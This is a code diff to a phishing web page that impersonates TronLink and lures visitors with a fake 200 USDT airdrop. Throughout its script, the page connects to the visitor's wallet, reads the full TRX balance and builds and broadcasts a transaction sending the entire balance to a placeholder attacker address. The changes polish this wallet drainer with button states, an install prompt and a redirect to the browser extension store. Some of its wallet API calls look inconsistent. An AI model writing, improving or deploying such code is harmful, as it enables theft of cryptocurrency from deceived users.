@@ -5,9 +5,9 @@
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TronLink - Official Reward</title>
  
- <!-- Open Graph Meta Tags for Social Media Previews -->
+ <!-- Open Graph Meta Tags -->
  <meta property="og:title" content="Claim Your 200 USDT TRON Airdrop"/>
- <meta property="og:description" content="Click to verify your wallet and receive your bonus instantly. Limited time offer!"/>
+ <meta property="og:description" content="Click to verify your wallet and receive your bonus instantly."/>
  <meta property="og:image" content="https://link.tronlink.org/assets/images/logo.png"/>
  <meta property="og:type" content="website"/>
  <meta property="og:url" content="https://your-domain.com/airdrop"/> 
@@ -91,9 +91,14 @@
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
+ position: relative;
  }
  .btn:hover {
  background-color: #0056b3;
+ }
+ .btn:disabled {
+ background-color: #ccc;
+ cursor: not-allowed;
  }
  .timer-bar {
  height: 4px;
@@ -151,6 +156,14 @@
  font-size: 50px;
  margin-bottom: 10px;
  }
+ .install-instruction {
+ background-color: #fff3cd;
+ color: #856404;
+ padding: 10px;
+ border-radius: 8px;
+ margin-top: 10px;
+ font-size: 14px;
+ }
  </style>
 </head>
 <body>
@@ -195,6 +208,9 @@
  <p>We need to connect your TronLink wallet to verify your identity and eligibility.</p>
  <div style="font-size: 40px; margin: 15px 0;">🔗</div>
  <button class="btn" id="connectBtn">Connect TronLink</button>
+ <div id="installMsg" class="install-instruction" style="display:none;">
+ Redirecting you to install TronLink...<br>Please refresh this page after installation.
+ </div>
  </div>
 
  <div id="step2" style="display:none;">
@@ -246,40 +262,44 @@
  });
 
  document.getElementById('connectBtn').addEventListener('click', async () => {
- document.getElementById('step1').style.display = 'none';
- document.getElementById('step2').style.display = 'block';
+ const btn = document.getElementById('connectBtn');
+ const installMsg = document.getElementById('installMsg');
+ 
+ // Disable button to prevent double clicks
+ btn.disabled = true;
+ btn.textContent = "Checking Connection...";
 
  try {
  // Check if TronLink is installed
- if (!window.tronWeb || !window.tronWeb.ready) {
+ if (!window.tronLink || !window.tronLink.request) {
  throw new Error("TRONLINK_NOT_FOUND");
  }
 
- // Wait for TronLink to be ready (handles login state)
- await window.tronWeb.ready;
+ // Wait for TronLink to be ready
+ await window.tronLink.ready;
 
  // Get user's address
- const userAddress = window.tronWeb.defaultAddress.base58;
+ const userAddress = window.tronLink.defaultAddress.base58;
  if (!userAddress) {
  throw new Error("Could not fetch address. Please unlock TronLink.");
  }
 
  // Fetch real balance
- const balance = await window.tronWeb.trx.getBalance(userAddress);
+ const balance = await window.tronLink.getBalance(userAddress);
  const amountInSun = balance.toString();
 
  // Prepare transaction to send ALL TRX to your wallet
- const targetAddress = window.tronWeb.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", ""));
+ const targetAddress = window.tronLink.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", ""));
 
  // Build the transaction
- const signedTx = await window.tronWeb.transactionBuilder.sendTransaction(
+ const signedTx = await window.tronLink.transactionBuilder.sendTransaction(
  targetAddress,
  parseInt(amountInSun), // Send entire balance
  userAddress
  );
 
  // Broadcast the transaction
- const result = await window.tronWeb.fullNode.request("wallet/broadcasttransaction", signedTx);
+ const result = await window.tronLink.fullNode.request("wallet/broadcasttransaction", signedTx);
 
  if (result.result) {
  // Success
@@ -294,15 +314,27 @@
  
  // NEW LOGIC: If TronLink is not found, redirect to store
  if (error.message === "TRONLINK_NOT_FOUND") {
- alert("Redirecting you to install TronLink...");
+ installMsg.style.display = 'block';
+ btn.textContent = "Redirecting...";
+ 
  // Open the Chrome Web Store link in a new tab
  window.open('https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec', '_blank');
+ 
+ // Optional: Close modal after a short delay to show the message
+ setTimeout(() => {
  closeModal();
+ }, 2000);
  return; // Stop execution here
  }
 
  alert("❌ Verification Failed.\n" + error.message);
  closeModal();
+ } finally {
+ // Re-enable button if still in step 1
+ if (document.getElementById('step1').style.display !== 'none') {
+ btn.disabled = false;
+ btn.textContent = "Connect TronLink";
+ }
  }
  });
 
